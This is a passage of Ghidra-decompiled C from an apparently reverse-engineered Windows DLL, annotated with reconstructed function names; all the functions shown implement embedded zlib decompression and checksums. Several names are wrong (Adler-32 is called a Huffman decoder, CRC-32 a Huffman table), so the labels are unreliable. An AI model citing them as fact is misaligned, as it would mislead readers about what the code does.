    *(undefined4 *)(param_1 + 0x18) = 0;
    if (*(int *)(param_1 + 0x20) == 0) {
      *(code **)(param_1 + 0x20) = ZlibHelperUnknownA_1000C223;
      *(undefined4 *)(param_1 + 0x28) = 0;
    }
    if (*(int *)(param_1 + 0x24) == 0) {
      *(code **)(param_1 + 0x24) = ZlibHelperUnknownB_1000C236;
    }
    iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x1bcc);
    if (iVar2 != 0) {
      *(int *)(param_1 + 0x1c) = iVar2;
      *(undefined4 *)(iVar2 + 0x34) = 0;
      iVar1 = EmbeddedZlibStreamProcessor_1000BB48(param_1,param_2);
      if (iVar1 != 0) {
        (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),iVar2);
        *(undefined4 *)(param_1 + 0x1c) = 0;
      }
      return iVar1;
    }
    iVar2 = -4;
  }
  return iVar2;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibFrontend_1000BB31
 * Ghidra symbol: FUN_1000bb31 | VA: 0x1000BB31 | original source line: 10888
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: EmbeddedZlibInitialize_1000BAA4
 */
void EmbeddedZlibFrontend_1000BB31(int param_1,char *param_2,int param_3)

{
  EmbeddedZlibInitialize_1000BAA4(param_1,0xf,param_2,param_3);
  return;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibStreamProcessor_1000BB48
 * Ghidra symbol: FUN_1000bb48 | VA: 0x1000BB48 | original source line: 10897
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: EmbeddedZlibStreamSupport_1000BBBF
 */
undefined4 EmbeddedZlibStreamProcessor_1000BB48(int param_1,uint param_2)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  
  iVar2 = param_1;
  if ((param_1 != 0) && (iVar1 = *(int *)(param_1 + 0x1c), iVar1 != 0)) {
    if ((int)param_2 < 0) {
      param_1 = 0;
      param_2 = -param_2;
    }
    else {
      param_1 = ((int)param_2 >> 4) + 1;
      if ((int)param_2 < 0x30) {
        param_2 = param_2 & 0xf;
      }
    }
    if ((param_2 == 0) || ((7 < (int)param_2 && ((int)param_2 < 0x10)))) {
      if ((*(int *)(iVar1 + 0x34) != 0) && (*(uint *)(iVar1 + 0x24) != param_2)) {
        (**(code **)(iVar2 + 0x24))(*(undefined4 *)(iVar2 + 0x28),*(undefined4 *)(iVar1 + 0x34));
        *(undefined4 *)(iVar1 + 0x34) = 0;
      }
      *(int *)(iVar1 + 8) = param_1;
      *(uint *)(iVar1 + 0x24) = param_2;
      uVar3 = EmbeddedZlibStreamSupport_1000BBBF(iVar2);
      return uVar3;
    }
  }
  return 0xfffffffe;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibStreamSupport_1000BBBF
 * Ghidra symbol: FUN_1000bbbf | VA: 0x1000BBBF | original source line: 10932
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: EmbeddedZlibStreamSupport2_1000BBEA
 */
undefined4 EmbeddedZlibStreamSupport_1000BBBF(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  if ((param_1 == 0) || (iVar1 = *(int *)(param_1 + 0x1c), iVar1 == 0)) {
    uVar2 = 0xfffffffe;
  }
  else {
    *(undefined4 *)(iVar1 + 0x28) = 0;
    *(undefined4 *)(iVar1 + 0x2c) = 0;
    *(undefined4 *)(iVar1 + 0x30) = 0;
    uVar2 = EmbeddedZlibStreamSupport2_1000BBEA(param_1);
  }
  return uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibStreamSupport2_1000BBEA
 * Ghidra symbol: FUN_1000bbea | VA: 0x1000BBEA | original source line: 10952
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined4 EmbeddedZlibStreamSupport2_1000BBEA(int param_1)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  
  if ((param_1 == 0) || (puVar2 = *(undefined4 **)(param_1 + 0x1c), puVar2 == (undefined4 *)0x0)) {
    uVar3 = 0xfffffffe;
  }
  else {
    puVar2[7] = 0;
    *(undefined4 *)(param_1 + 0x14) = 0;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0x18) = 0;
    if (puVar2[2] != 0) {
      *(uint *)(param_1 + 0x30) = puVar2[2] & 1;
    }
    puVar2[0x6f1] = 0xffffffff;
    puVar1 = puVar2 + 0x14c;
    *puVar2 = 0;
    puVar2[1] = 0;
    puVar2[3] = 0;
    puVar2[8] = 0;
    puVar2[0xe] = 0;
    puVar2[0xf] = 0;
    puVar2[0x1b] = puVar1;
    puVar2[0x14] = puVar1;
    puVar2[0x13] = puVar1;
    uVar3 = 0;
    puVar2[5] = 0x8000;
    puVar2[0x6f0] = 1;
  }
  return uVar3;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibBlockDecoder_1000BC5B
 * Ghidra symbol: FUN_1000bc5b | VA: 0x1000BC5B | original source line: 10990
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
undefined4 __cdecl EmbeddedZlibBlockDecoder_1000BC5B(int param_1,int param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  size_t _Size;
  uint uVar3;
  
  iVar1 = *(int *)(param_1 + 0x1c);
  if (*(int *)(iVar1 + 0x34) == 0) {
    iVar2 = (**(code **)(param_1 + 0x20))
                      (*(undefined4 *)(param_1 + 0x28),
                       1 << ((byte)*(undefined4 *)(iVar1 + 0x24) & 0x1f),1);
    *(int *)(iVar1 + 0x34) = iVar2;
    if (iVar2 == 0) {
      return 1;
    }
  }
  if (*(int *)(iVar1 + 0x28) == 0) {
    *(int *)(iVar1 + 0x28) = 1 << ((byte)*(undefined4 *)(iVar1 + 0x24) & 0x1f);
    *(undefined4 *)(iVar1 + 0x30) = 0;
    *(undefined4 *)(iVar1 + 0x2c) = 0;
  }
  uVar3 = *(uint *)(iVar1 + 0x28);
  if (param_3 < uVar3) {
    uVar3 = uVar3 - *(int *)(iVar1 + 0x30);
    if (param_3 < uVar3) {
      uVar3 = param_3;
    }
    memcpy((void *)(*(int *)(iVar1 + 0x34) + *(int *)(iVar1 + 0x30)),(void *)(param_2 - param_3),
           uVar3);
    _Size = param_3 - uVar3;
    if (_Size == 0) {
      *(int *)(iVar1 + 0x30) = *(int *)(iVar1 + 0x30) + uVar3;
      if (*(uint *)(iVar1 + 0x30) == *(uint *)(iVar1 + 0x28)) {
        *(undefined4 *)(iVar1 + 0x30) = 0;
      }
      if (*(uint *)(iVar1 + 0x28) <= *(uint *)(iVar1 + 0x2c)) {
        return 0;
      }
      iVar2 = *(uint *)(iVar1 + 0x2c) + uVar3;
      goto LAB_1000bd17;
    }
    memcpy(*(void **)(iVar1 + 0x34),(void *)(param_2 - _Size),_Size);
    *(size_t *)(iVar1 + 0x30) = _Size;
  }
  else {
    memcpy(*(void **)(iVar1 + 0x34),(void *)(param_2 - uVar3),uVar3);
    *(undefined4 *)(iVar1 + 0x30) = 0;
  }
  iVar2 = *(int *)(iVar1 + 0x28);
LAB_1000bd17:
  *(int *)(iVar1 + 0x2c) = iVar2;
  return 0;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibHuffmanDecoder_1000BD21
 * Ghidra symbol: FUN_1000bd21 | VA: 0x1000BD21 | original source line: 11048
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
uint EmbeddedZlibHuffmanDecoder_1000BD21(uint param_1,byte *param_2,uint param_3)

{
  byte *pbVar1;
  byte *pbVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  int iVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  int iVar17;
  int iVar18;
  int iVar19;
  int iVar20;
  uint uVar21;
  
  uVar5 = param_1 & 0xffff;
  uVar21 = param_1 >> 0x10;
  if (param_3 == 1) {
    uVar5 = uVar5 + *param_2;
    if (0xfff0 < uVar5) {
      uVar5 = uVar5 - 0xfff1;
    }
    uVar21 = uVar21 + uVar5;
    if (0xfff0 < uVar21) {
      uVar21 = uVar21 - 0xfff1;
    }
  }
  else {
    if (param_2 == (byte *)0x0) {
      return 1;
    }
    if (param_3 < 0x10) {
      for (; param_3 != 0; param_3 = param_3 - 1) {
        uVar5 = uVar5 + *param_2;
        param_2 = param_2 + 1;
        uVar21 = uVar21 + uVar5;
      }
      if (0xfff0 < uVar5) {
        uVar5 = uVar5 - 0xfff1;
      }
      return uVar21 % 0xfff1 << 0x10 | uVar5;
    }
    if (0x15af < param_3) {
      param_1 = param_3 / 0x15b0;
      do {
        param_3 = param_3 - 0x15b0;
        iVar3 = 0x15b;
        do {
          iVar6 = uVar5 + *param_2;
          pbVar1 = param_2 + 0xf;
          iVar7 = iVar6 + (uint)param_2[1];
          iVar8 = iVar7 + (uint)param_2[2];
          iVar9 = iVar8 + (uint)param_2[3];
          iVar10 = iVar9 + (uint)param_2[4];
          iVar11 = iVar10 + (uint)param_2[5];
          iVar12 = iVar11 + (uint)param_2[6];
          iVar13 = iVar12 + (uint)param_2[7];
          iVar14 = iVar13 + (uint)param_2[8];
          iVar15 = iVar14 + (uint)param_2[9];
          iVar16 = iVar15 + (uint)param_2[10];
          iVar17 = iVar16 + (uint)param_2[0xb];
          iVar18 = iVar17 + (uint)param_2[0xc];
          iVar19 = iVar18 + (uint)param_2[0xd];
          pbVar2 = param_2 + 0xe;
          param_2 = param_2 + 0x10;
          iVar20 = iVar19 + (uint)*pbVar2;
          uVar5 = iVar20 + (uint)*pbVar1;
          uVar21 = uVar21 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 + iVar13 +
                   iVar14 + iVar15 + iVar16 + iVar17 + iVar18 + iVar19 + iVar20 + uVar5;
          iVar3 = iVar3 + -1;
        } while (iVar3 != 0);
        uVar5 = uVar5 % 0xfff1;
        uVar21 = uVar21 % 0xfff1;
        param_1 = param_1 - 1;
      } while (param_1 != 0);
    }
    if (param_3 != 0) {
      if (0xf < param_3) {
        uVar4 = param_3 >> 4;
        do {
          param_3 = param_3 - 0x10;
          iVar3 = uVar5 + *param_2;
          iVar6 = iVar3 + (uint)param_2[1];
          iVar7 = iVar6 + (uint)param_2[2];
          iVar8 = iVar7 + (uint)param_2[3];
          iVar9 = iVar8 + (uint)param_2[4];
          iVar10 = iVar9 + (uint)param_2[5];
          iVar11 = iVar10 + (uint)param_2[6];
          iVar12 = iVar11 + (uint)param_2[7];
          iVar13 = iVar12 + (uint)param_2[8];
          iVar14 = iVar13 + (uint)param_2[9];
          iVar15 = iVar14 + (uint)param_2[10];
          iVar16 = iVar15 + (uint)param_2[0xb];
          iVar17 = iVar16 + (uint)param_2[0xc];
          iVar18 = iVar17 + (uint)param_2[0xd];
          iVar19 = iVar18 + (uint)param_2[0xe];
          pbVar1 = param_2 + 0xf;
          param_2 = param_2 + 0x10;
          uVar5 = iVar19 + (uint)*pbVar1;
          uVar21 = uVar21 + iVar3 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +
                   iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + iVar18 + iVar19 + uVar5;
          uVar4 = uVar4 - 1;
        } while (uVar4 != 0);
      }
      for (; param_3 != 0; param_3 = param_3 - 1) {
        uVar5 = uVar5 + *param_2;
        param_2 = param_2 + 1;
        uVar21 = uVar21 + uVar5;
      }
      uVar5 = uVar5 % 0xfff1;
      uVar21 = uVar21 % 0xfff1;
    }
  }
  return uVar21 << 0x10 | uVar5;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibHuffmanHelper_1000BF51
 * Ghidra symbol: FUN_1000bf51 | VA: 0x1000BF51 | original source line: 11176
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: EmbeddedZlibHuffmanTable_1000BF73
 */
uint EmbeddedZlibHuffmanHelper_1000BF51(uint param_1,uint *param_2,uint param_3)

{
  uint uVar1;
  
  if (param_2 == (uint *)0x0) {
    uVar1 = 0;
  }
  else {
    uVar1 = EmbeddedZlibHuffmanTable_1000BF73(param_1,param_2,param_3);
  }
  return uVar1;
}



/*
 * RECONSTRUCTED FUNCTION: EmbeddedZlibHuffmanTable_1000BF73
 * Ghidra symbol: FUN_1000bf73 | VA: 0x1000BF73 | original source line: 11192
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
uint __cdecl EmbeddedZlibHuffmanTable_1000BF73(uint param_1,uint *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  
  uVar2 = ~param_1;
  for (; (param_3 != 0 && (((uint)param_2 & 3) != 0)); param_2 = (uint *)((int)param_2 + 1)) {
    uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_1000dd60 + (((byte)*param_2 ^ uVar2) & 0xff) * 4);
    param_3 = param_3 - 1;
  }
  if (0x1f < param_3) {
    param_1 = param_3 >> 5;
    do {
      uVar2 = uVar2 ^ *param_2;
      uVar2 = *(uint *)(&DAT_1000e160 + (uVar2 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_1000e560 + (uVar2 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_1000dd60 + (uVar2 >> 0x18) * 4) ^
              *(uint *)(&DAT_1000e960 + (uVar2 & 0xff) * 4) ^ param_2[1];
      uVar2 = *(uint *)(&DAT_1000e160 + (uVar2 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_1000e560 + (uVar2 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_1000dd60 + (uVar2 >> 0x18) * 4) ^
              *(uint *)(&DAT_1000e960 + (uVar2 & 0xff) * 4) ^ param_2[2];
      uVar2 = *(uint *)(&DAT_1000e160 + (uVar2 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_1000e560 + (uVar2 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_1000dd60 + (uVar2 >> 0x18) * 4) ^
              *(uint *)(&DAT_1000e960 + (uVar2 & 0xff) * 4) ^ param_2[3];
      uVar2 = *(uint *)(&DAT_1000e160 + (uVar2 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_1000e560 + (uVar2 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_1000dd60 + (uVar2 >> 0x18) * 4) ^
              *(uint *)(&DAT_1000e960 + (uVar2 & 0xff) * 4) ^ param_2[4];
      uVar2 = *(uint *)(&DAT_1000e160 + (uVar2 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_1000e560 + (uVar2 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_1000dd60 + (uVar2 >> 0x18) * 4) ^
              *(uint *)(&DAT_1000e960 + (uVar2 & 0xff) * 4) ^ param_2[5];
      param_3 = param_3 - 0x20;
      uVar2 = *(uint *)(&DAT_1000e160 + (uVar2 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_1000e560 + (uVar2 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_1000dd60 + (uVar2 >> 0x18) * 4) ^
              *(uint *)(&DAT_1000e960 + (uVar2 & 0xff) * 4) ^ param_2[6];
      uVar2 = *(uint *)(&DAT_1000e160 + (uVar2 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_1000e560 + (uVar2 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_1000dd60 + (uVar2 >> 0x18) * 4) ^
              *(uint *)(&DAT_1000e960 + (uVar2 & 0xff) * 4) ^ param_2[7];
      param_2 = param_2 + 8;
      uVar2 = *(uint *)(&DAT_1000e160 + (uVar2 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_1000e560 + (uVar2 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_1000dd60 + (uVar2 >> 0x18) * 4) ^
              *(uint *)(&DAT_1000e960 + (uVar2 & 0xff) * 4);
      param_1 = param_1 - 1;
    } while (param_1 != 0);
  }
  if (3 < param_3) {
    uVar1 = param_3 >> 2;
    do {
      uVar2 = uVar2 ^ *param_2;
      param_3 = param_3 - 4;
      param_2 = param_2 + 1;
      uVar2 = *(uint *)(&DAT_1000e160 + (uVar2 >> 0x10 & 0xff) * 4) ^
              *(uint *)(&DAT_1000e560 + (uVar2 >> 8 & 0xff) * 4) ^
              *(uint *)(&DAT_1000dd60 + (uVar2 >> 0x18) * 4) ^
              *(uint *)(&DAT_1000e960 + (uVar2 & 0xff) * 4);
      uVar1 = uVar1 - 1;
    } while (uVar1 != 0);
  }
  for (; param_3 != 0; param_3 = param_3 - 1) {
    uVar2 = uVar2 >> 8 ^ *(uint *)(&DAT_1000dd60 + (((byte)*param_2 ^ uVar2) & 0xff) * 4);
    param_2 = (uint *)((int)param_2 + 1);
  }
  return ~uVar2;
}



/*
 * RECONSTRUCTED FUNCTION: ZlibHelperUnknownA_1000C223
 * Ghidra symbol: FUN_1000c223 | VA: 0x1000C223 | original source line: 11266
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
void __cdecl ZlibHelperUnknownA_1000C223(undefined4 param_1,int param_2,int param_3)

{
  malloc(param_2 * param_3);
  return;
}



/*
 * RECONSTRUCTED FUNCTION: ZlibHelperUnknownB_1000C236
 * Ghidra symbol: FUN_1000c236 | VA: 0x1000C236 | original source line: 11275
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
void __cdecl ZlibHelperUnknownB_1000C236(undefined4 param_1,void *param_2)

{
  free(param_2);
  return;
}



undefined4 __cdecl
/*
 * RECONSTRUCTED FUNCTION: ZlibRuntimeTableHelperA_1000C244
 * Ghidra symbol: FUN_1000c244 | VA: 0x1000C244 | original source line: 11285
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
ZlibRuntimeTableHelperA_1000C244(int param_1,int param_2,uint param_3,int *param_4,uint *param_5,ushort *param_6)

{
  byte bVar1;
  ushort uVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  char cVar7;
  uint uVar8;
  uint uVar9;
  ushort *puVar10;
  uint uVar11;
  uint *puVar12;
  ushort auStack_80 [16];
  ushort local_60 [16];
  uint local_40;
  uint local_3c;
  uint local_38;
  uint local_34;
  uint local_30;
  int local_2c;
  uint local_28;
  uint local_24;
  ushort *local_20;
  ushort *local_1c;
  uint local_18;
  uint local_14;
  int local_10;
  int local_c;
  uint local_8;
  
  puVar10 = local_60;
  for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {
    puVar10[0] = 0;
    puVar10[1] = 0;
    puVar10 = puVar10 + 2;
  }
  uVar5 = 0;
  if (param_3 != 0) {
    do {
      local_60[*(ushort *)(param_2 + uVar5 * 2)] = local_60[*(ushort *)(param_2 + uVar5 * 2)] + 1;
      uVar5 = uVar5 + 1;
    } while (uVar5 < param_3);
  }
  uVar5 = 0xf;
  do {
    if (local_60[uVar5] != 0) break;
    uVar5 = uVar5 - 1;
  } while (uVar5 != 0);
  uVar11 = *param_5;
  if (uVar5 < *param_5) {
    uVar11 = uVar5;
  }
  if (uVar5 == 0) {
    *(undefined4 *)*param_4 = 0x140;
    *param_4 = *param_4 + 4;
    *(undefined4 *)*param_4 = 0x140;
    *param_4 = *param_4 + 4;
    *param_5 = 1;
    return 0;
  }
  uVar8 = 1;
  local_14 = 1;
  if (1 < uVar5) {
    do {
      if (local_60[uVar8] != 0) break;
      uVar8 = uVar8 + 1;
    } while (uVar8 < uVar5);
    local_14 = uVar8;
  }
  iVar4 = 1;
  uVar8 = 1;
  if (uVar11 < local_14) {
    uVar11 = local_14;
  }
  local_40 = uVar11;
  do {
    iVar4 = iVar4 * 2 - (uint)local_60[uVar8];
    if (iVar4 < 0) {
      return 0xffffffff;
    }
    uVar8 = uVar8 + 1;
  } while (uVar8 < 0x10);
  if ((0 < iVar4) && ((param_1 == 0 || (uVar5 != 1)))) {
    return 0xffffffff;
  }
  auStack_80[1] = 0;
  uVar8 = 2;
  do {
    *(short *)((int)auStack_80 + uVar8 + 2) =
         *(short *)((int)auStack_80 + uVar8) + *(short *)((int)local_60 + uVar8);
    uVar8 = uVar8 + 2;
  } while (uVar8 < 0x1e);
  uVar8 = 0;
  if (param_3 != 0) {
    do {
      uVar2 = *(ushort *)(param_2 + uVar8 * 2);
      if (uVar2 != 0) {
        param_6[auStack_80[uVar2]] = (ushort)uVar8;
        auStack_80[*(ushort *)(param_2 + uVar8 * 2)] =
             auStack_80[*(ushort *)(param_2 + uVar8 * 2)] + 1;
      }
      uVar8 = uVar8 + 1;
    } while (uVar8 < param_3);
  }
  local_30 = 0xffffffff;
  if (param_1 == 0) {
    local_20 = param_6;
    local_10 = 0x13;
    local_1c = param_6;
  }
  else {
    if (param_1 != 1) {
      local_20 = (ushort *)&DAT_1000feb8;
      local_1c = (ushort *)&DAT_1000fef8;
      local_10 = -1;
      goto LAB_1000c3b9;
    }
    local_10 = 0x100;
    local_20 = (ushort *)&DAT_1000fc36;
    local_1c = (ushort *)&DAT_1000fc76;
  }
LAB_1000c3b9:
  local_8 = 0;
  local_18 = 0;
  local_c = *param_4;
  local_24 = 1 << ((byte)uVar11 & 0x1f);
  local_28 = local_24;
  local_38 = local_24 - 1;
  if (((param_1 == 1) && (0x354 < local_24)) ||
     ((uVar9 = local_14, uVar8 = 0, param_1 == 2 && (0x250 < local_24)))) {
    return 1;
  }
  do {
    do {
      do {
        cVar7 = (char)uVar9;
        bVar1 = cVar7 - (byte)local_8;
        uVar2 = *param_6;
        uVar3 = (uint)uVar2;
        if ((int)uVar3 < local_10) {
          param_3._0_2_ = (ushort)bVar1 << 8;
        }
        else if (local_10 < (int)uVar3) {
          param_3._0_2_ = CONCAT11(bVar1,(char)local_1c[uVar3]);
          uVar2 = local_20[uVar3];
        }
        else {
          param_3 = CONCAT31((uint3)bVar1,0x60);
          uVar2 = 0;
        }
        param_3 = CONCAT22(uVar2,(ushort)param_3);
        local_2c = 1 << (cVar7 - (byte)local_8 & 0x1f);
        local_3c = local_24;
        local_34 = local_2c * 4;
        puVar12 = (uint *)(local_c + ((uVar8 >> ((byte)local_8 & 0x1f)) + local_24) * 4);
        uVar8 = local_24;
        do {
          puVar12 = puVar12 + -local_2c;
          *puVar12 = param_3;
          uVar8 = uVar8 - local_2c;
        } while (uVar8 != 0);
        for (uVar8 = 1 << (cVar7 - 1U & 0x1f); (local_18 & uVar8) != 0; uVar8 = uVar8 >> 1) {
        }
        if (uVar8 == 0) {
          local_18 = 0;
        }
        else {
          local_18 = uVar8 + (uVar8 - 1 & local_18);
        }
        uVar8 = local_18;
        param_6 = param_6 + 1;
        puVar10 = local_60 + uVar9;
        *puVar10 = *puVar10 - 1;
        if (*puVar10 == 0) {
          if (uVar9 == uVar5) {
            if (uVar8 != 0) {
              param_3._0_2_ = CONCAT11(cVar7 - (byte)local_8,0x40);
              param_3 = (uint)(ushort)param_3;
              *(uint *)(local_c + uVar8 * 4) = param_3;
            }
            *param_4 = *param_4 + local_28 * 4;
            *param_5 = uVar11;
            return 0;
          }
          uVar9 = (uint)*(ushort *)(param_2 + (uint)*param_6 * 2);
          local_14 = uVar9;
        }
      } while (uVar9 <= uVar11);
      local_34 = local_38 & uVar8;
    } while (local_34 == local_30);
    if (local_8 == 0) {
      local_8 = uVar11;
    }
    local_c = local_c + local_3c * 4;
    iVar6 = uVar9 - local_8;
    local_3c = local_8 + iVar6;
    iVar4 = 1 << ((byte)iVar6 & 0x1f);
    if (local_3c < uVar5) {
      puVar10 = local_60 + local_3c;
      do {
        uVar2 = *puVar10;
        if ((int)(iVar4 - (uint)uVar2) < 1) break;
        iVar6 = iVar6 + 1;
        puVar10 = puVar10 + 1;
        local_3c = local_3c + 1;
        iVar4 = (iVar4 - (uint)uVar2) * 2;
      } while (local_3c < uVar5);
      uVar9 = local_14;
      uVar11 = local_40;
    }
    local_24 = 1 << ((byte)iVar6 & 0x1f);
    local_28 = local_28 + local_24;
    if ((param_1 == 1) && (0x354 < local_28)) {
      return 1;
    }
    if ((param_1 == 2) && (0x250 < local_28)) {
      return 1;
    }
    local_30 = local_34;
    *(byte *)(*param_4 + local_34 * 4) = (byte)iVar6;
    *(char *)(*param_4 + 1 + local_34 * 4) = (char)uVar11;
    *(short *)(*param_4 + 2 + local_34 * 4) = (short)(local_c - *param_4 >> 2);
    uVar8 = local_18;
  } while( true );
}



// WARNING: Removing unreachable block (ram,0x1000c7cd)
// WARNING: Removing unreachable block (ram,0x1000c7ec)

/*
 * RECONSTRUCTED FUNCTION: ZlibRuntimeTableHelperB_1000C6D0
 * Ghidra symbol: FUN_1000c6d0 | VA: 0x1000C6D0 | original source line: 11519
 * Confidence: LOW (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: none mapped
 */
void __cdecl ZlibRuntimeTableHelperB_1000C6D0(int *param_1,int param_2)

{
  undefined1 uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  uint uVar7;
  byte bVar8;
  undefined1 *puVar9;
  int iVar10;
  uint uVar11;
  uint uVar12;
  char *pcVar13;
  uint uVar14;
  undefined4 uVar15;
  byte bVar16;
  undefined3 uVar17;
  uint uVar18;
  uint *puVar19;
  undefined1 *puVar20;
  uint *puVar21;
  undefined1 *puVar22;
  byte in_CF;
  byte in_PF;
  byte in_AF;
  byte in_ZF;
  byte in_SF;
  byte in_TF;
  byte in_IF;
  bool bVar23;
  byte in_OF;
  byte in_NT;
  byte in_AC;
  byte in_VIF;
  byte in_VIP;
  byte in_ID;
  uint uVar24;
  ulonglong in_MM0;
  ulonglong in_MM1;
  ulonglong uVar25;
  uint *local_40;
  uint local_38 [3];
  undefined1 *local_2c;
  uint *local_28;
  uint local_24;
  uint local_20;
  undefined1 *local_1c;
  undefined1 *local_18;
  uint uStack_14;
  
  uStack_14 = (uint)(in_NT & 1) * 0x4000 | (uint)(in_OF & 1) * 0x800 | (uint)(in_IF & 1) * 0x200 |
              (uint)(in_TF & 1) * 0x100 | (uint)(in_SF & 1) * 0x80 | (uint)(in_ZF & 1) * 0x40 |
              (uint)(in_AF & 1) * 0x10 | (uint)(in_PF & 1) * 4 | (uint)(in_CF & 1) |
              (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000 |
              (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
  bVar23 = false;
  iVar6 = param_1[7];
  iVar10 = param_1[1];
  local_28 = (uint *)*param_1;
  local_40 = (uint *)((int)local_28 + iVar10 + -0xb);
  local_18 = (undefined1 *)param_1[3];
  puVar9 = local_18 + param_1[4] + -0x101;
  local_2c = local_18 + -(param_2 - param_1[4]);
  uVar2 = *(uint *)(iVar6 + 0x4c);
  iVar3 = *(int *)(iVar6 + 0x50);
  uVar4 = (1 << ((byte)*(undefined4 *)(iVar6 + 0x54) & 0x1f)) - 1;
  uVar5 = (1 << ((byte)*(undefined4 *)(iVar6 + 0x58) & 0x1f)) - 1;
  local_20 = *(uint *)(iVar6 + 0x28);
  local_24 = *(uint *)(iVar6 + 0x30);
  local_1c = *(undefined1 **)(iVar6 + 0x34);
  uVar18 = *(uint *)(iVar6 + 0x38);
  uVar12 = *(uint *)(iVar6 + 0x3c);
  if (local_28 < local_40) {
    for (; ((uint)local_28 & 3) != 0; local_28 = (uint *)((int)local_28 + 1)) {
      uVar18 = uVar18 | (uint)(byte)*local_28 << ((byte)uVar12 & 0x1f);
      uVar12 = uVar12 + 8;
    }
  }
  else {
    iVar6 = 0xc - iVar10;
    puVar19 = local_28;
    puVar21 = local_38;
    for (; iVar10 != 0; iVar10 = iVar10 + -1) {
      *(char *)puVar21 = (char)*puVar19;
      puVar19 = (uint *)((int)puVar19 + 1);
      puVar21 = (uint *)((int)puVar21 + 1);
    }
    for (; iVar6 != 0; iVar6 = iVar6 + -1) {
      *(undefined1 *)puVar21 = 0;
      puVar21 = (uint *)((int)puVar21 + 1);
    }
    local_40 = local_38;
    local_28 = local_40;
  }
  while( true ) {
    uVar7 = DAT_10016000 - 2;
    if (uVar7 == 0) break;
    if (DAT_10016000 >= 2) goto LAB_1000c820;
    uVar24 = (uint)(in_NT & 1) * 0x4000 | (uint)SBORROW4(DAT_10016000,2) * 0x800 |
             (uint)bVar23 * 0x400 | (uint)(in_IF & 1) * 0x200 | (uint)(in_TF & 1) * 0x100 |
             (uint)((int)uVar7 < 0) * 0x80 | (uint)(in_AF & 1) * 0x10 |
             (uint)((POPCOUNT(uVar7 & 0xff) & 1U) == 0) * 4 | (uint)(DAT_10016000 < 2) |
             (uint)(in_ID & 1) * 0x200000 | (uint)(in_VIP & 1) * 0x100000 |
             (uint)(in_VIF & 1) * 0x80000 | (uint)(in_AC & 1) * 0x40000;
    uVar7 = uVar24 ^ 0x200000;
    in_NT = (uVar7 & 0x4000) != 0;
    bVar23 = (uVar7 & 0x400) != 0;
    in_IF = (uVar7 & 0x200) != 0;
    in_TF = (uVar7 & 0x100) != 0;
    in_AF = (uVar7 & 0x10) != 0;
    in_ID = (uVar7 & 0x200000) != 0;
    in_AC = (uVar7 & 0x40000) != 0;
    in_VIP = 0;
    in_VIF = 0;
    if (((uint)in_NT * 0x4000 | (uint)((uVar7 & 0x800) != 0) * 0x800 | (uint)bVar23 * 0x400 |
